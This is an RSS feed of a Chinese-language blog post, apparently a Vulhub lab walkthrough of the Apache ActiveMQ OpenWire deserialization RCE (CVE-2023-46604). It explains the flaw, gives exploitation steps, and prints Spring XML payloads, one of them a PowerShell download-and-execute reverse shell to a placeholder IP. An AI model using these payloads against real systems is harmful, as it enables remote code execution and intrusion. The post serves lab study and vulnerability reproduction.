<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Vulhub on Ranch&#39;s Blog</title>
        <link>http://ranch007.github.io/tags/vulhub/</link>
        <description>Recent content in Vulhub on Ranch&#39;s Blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>Ranch&#39;s Blog</copyright><atom:link href="http://ranch007.github.io/tags/vulhub/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>Apache ActiveMQ OpenWire 协议反序列化 RCE（CVE 2023 46604）</title>
        <link>http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/</link>
        <pubDate>Sun, 10 Nov 2024 19:40:36 +0800</pubDate>
        
        <guid>http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/</guid>
        <description>&lt;img src="http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/activemq.png" alt="Featured image of post Apache ActiveMQ OpenWire 协议反序列化 RCE（CVE 2023 46604）" /&gt;&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;Apache ActiveMQ 是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;OpenWire&lt;/code&gt;协议在ActiveMQ中被用于多语言客户端与服务端通信。在&lt;code&gt;Apache ActiveMQ 5.18.2&lt;/code&gt;版本及以前，&lt;code&gt;OpenWire&lt;/code&gt;协议通信过程中存在一处反序列化漏洞，该漏洞可以允许具有网络访问权限的远程攻击者通过操作 &lt;code&gt;OpenWire&lt;/code&gt; 协议中的序列化类类型，导致代理的类路径上的任何类实例化，从而执行任意命令。&lt;/p&gt;
&lt;h2 id=&#34;影响范围&#34;&gt;影响范围
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Apache ActiveMQ ≤ 5.18.2&lt;/li&gt;
&lt;li&gt;Apache ActiveMQ ＜5.17.6&lt;/li&gt;
&lt;li&gt;Apache ActiveMQ ＜5.16.7&lt;/li&gt;
&lt;li&gt;Apache ActiveMQ ＜5.15.16&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;环境构建&#34;&gt;环境构建
&lt;/h2&gt;&lt;p&gt;ActiveMQ运行后，默认监听如下两个端口：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;默认端口&lt;/th&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;默认条件&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;8161 web&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;需配置才可远程访问&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;61616 tcp&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;远程访问&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;反序列化漏洞出现在61616端口中。 执行如下命令启动一个&lt;code&gt;ActiveMQ 5.17.3&lt;/code&gt;版本服务器：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker compose up -d
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/assets/image-20241110202705331.png&#34;
	width=&#34;607&#34;
	height=&#34;83&#34;
	srcset=&#34;http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/assets/image-20241110202705331_hu13754939053701747153.png 480w, http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/assets/image-20241110202705331_hu17208112663637186468.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;启动ActiveMQ 5.17.3服务器&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;731&#34;
		data-flex-basis=&#34;1755px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;在利用之前请访问&lt;code&gt;http://your-ip:8161&lt;/code&gt;以确认服务已成功启动，后续只需要使用端口 61616。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/assets/image-20241110202751046.png&#34;
	width=&#34;508&#34;
	height=&#34;265&#34;
	srcset=&#34;http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/assets/image-20241110202751046_hu12848334423091940409.png 480w, http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/assets/image-20241110202751046_hu12184015033353542576.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;服务成功启动&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;191&#34;
		data-flex-basis=&#34;460px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;原理分析&#34;&gt;原理分析
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;分析来自于《&lt;a class=&#34;link&#34; href=&#34;https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Apache ActiveMQ CVE-2023-46604 RCE 分析——Boogipop&lt;/a&gt;》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/assets/202310252044590.png&#34;
	width=&#34;2272&#34;
	height=&#34;1182&#34;
	srcset=&#34;http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/assets/202310252044590_hu12014036354351735574.png 480w, http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/assets/202310252044590_hu79149111938962621.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;漏洞点存在createThrowable&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;192&#34;
		data-flex-basis=&#34;461px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这边的diff可以看到，漏洞点在&lt;code&gt;BaseDataStreamMarshaller&lt;/code&gt;的&lt;code&gt;createThrowable&lt;/code&gt;方法。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/assets/image.png&#34;
	width=&#34;2046&#34;
	height=&#34;745&#34;
	srcset=&#34;http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/assets/image_hu8409384196192003088.png 480w, http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/assets/image_hu400880738855281299.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;可实例化的类&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;274&#34;
		data-flex-basis=&#34;659px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ActiveMQ Classic 代理附带了一些 Spring 依赖项，包括&lt;a class=&#34;link&#34; href=&#34;https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/context/support/ClassPathXmlApplicationContext.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;&lt;code&gt;org.springframework.context.support.ClassPathXmlApplicationContext&lt;/code&gt;&lt;/a&gt;用于运行 Spring 应用程序的依赖项。此类不仅存在于代理中，而且还是极为常见的客户端依赖项。它有&lt;a class=&#34;link&#34; href=&#34;https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/context/support/ClassPathXmlApplicationContext.html#%28java.lang.String%29&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;一个构造函数&lt;/a&gt;，该构造函数接受一个&lt;code&gt;String&lt;/code&gt;，该构造函数可以是指向网络上的 XML 应用程序配置文件的 HTTP URL。&lt;/p&gt;
&lt;p&gt;此漏洞的唯一已知利用方法是&lt;code&gt;ClassPathXmlApplicationContext&lt;/code&gt;通过 HTTP 从网络某处加载恶意 XML 应用程序配置文件。此恶意 XML 明确定义了要在存在漏洞的机器（即代理或客户端）上运行的任意代码。&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现&#34;&gt;漏洞复现
&lt;/h2&gt;&lt;p&gt;首先，启动一个HTTP反连服务器，其中包含我们的【&lt;a class=&#34;link&#34; href=&#34;https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2023-46604/poc.xml&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;poc.xml&lt;/a&gt;】：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 -m http.server 6666
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/assets/image-20241110203033599.png&#34;
	width=&#34;609&#34;
	height=&#34;179&#34;
	srcset=&#34;http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/assets/image-20241110203033599_hu17905710925062467841.png 480w, http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/assets/image-20241110203033599_hu4344617291404405677.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;python启动http服务&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;340&#34;
		data-flex-basis=&#34;816px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;然后，执行【&lt;a class=&#34;link&#34; href=&#34;https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2023-46604/poc.py&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;poc.py&lt;/a&gt;】，传入的三个参数分别是目标服务器地址、端口，以及包含poc.xml 的反连平台URL：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python poc.py rhost rport http://vps:port/poc.xml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/assets/image-20241110203224505.png&#34;
	width=&#34;609&#34;
	height=&#34;216&#34;
	srcset=&#34;http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/assets/image-20241110203224505_hu14872620770630167082.png 480w, http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/assets/image-20241110203224505_hu8994698563172520431.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;成功执行poc&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;281&#34;
		data-flex-basis=&#34;676px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;执行完成后，进入&lt;code&gt;ActiveMQ&lt;/code&gt;容器：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker exec cve-2023-46604-activemq-1 ls -l /tmp 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;可以看见命令&lt;code&gt;touch /tmp/activeMQ-RCE-success&lt;/code&gt; 已经被成功执行。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/assets/image-20241110203452179.png&#34;
	width=&#34;605&#34;
	height=&#34;56&#34;
	srcset=&#34;http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/assets/image-20241110203452179_hu7225902321127015390.png 480w, http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/assets/image-20241110203452179_hu2456150736552046493.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;成功执行touch命令&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1080&#34;
		data-flex-basis=&#34;2592px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;【POC-DNSLog】&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-8&amp;#34;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;beans&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;xmlns=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.springframework.org/schema/beans&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;xmlns:xsi=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.w3.org/2001/XMLSchema-instance&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;xsi:schemaLocation=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;bean&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;id=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;pb&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;java.lang.ProcessBuilder&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;init-method=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;start&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;constructor-arg&amp;gt;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;lt;list&amp;gt;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nt&#34;&gt;&amp;lt;value&amp;gt;&lt;/span&gt;ping&lt;span class=&#34;nt&#34;&gt;&amp;lt;/value&amp;gt;&lt;/span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nt&#34;&gt;&amp;lt;value&amp;gt;&lt;/span&gt;xxx.xxx.xxx.cn&lt;span class=&#34;nt&#34;&gt;&amp;lt;/value&amp;gt;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;lt;/list&amp;gt;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;/constructor-arg&amp;gt;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;/bean&amp;gt;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/beans&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;【POC-win】&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;beans&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;xmlns=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.springframework.org/schema/beans&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;na&#34;&gt;xmlns:xsi=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.w3.org/2001/XMLSchema-instance&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;na&#34;&gt;xsi:schemaLocation=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;bean&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;id=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;pb&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;java.lang.ProcessBuilder&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;init-method=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;start&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nt&#34;&gt;&amp;lt;constructor-arg&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nt&#34;&gt;&amp;lt;list&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;nt&#34;&gt;&amp;lt;value&amp;gt;&lt;/span&gt;powershell&lt;span class=&#34;nt&#34;&gt;&amp;lt;/value&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;nt&#34;&gt;&amp;lt;value&amp;gt;&lt;/span&gt;-c&lt;span class=&#34;nt&#34;&gt;&amp;lt;/value&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;nt&#34;&gt;&amp;lt;value&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;![CDATA[IEX (New-Object Net.WebClient).DownloadString(&amp;#39;https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1&amp;#39;); Invoke-PowerShellTcp -Reverse -IPAddress x.x.x.x -Port 3333]]&amp;gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/value&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nt&#34;&gt;&amp;lt;/list&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nt&#34;&gt;&amp;lt;/constructor-arg&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;/bean&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/beans&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;【POC-linux】&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
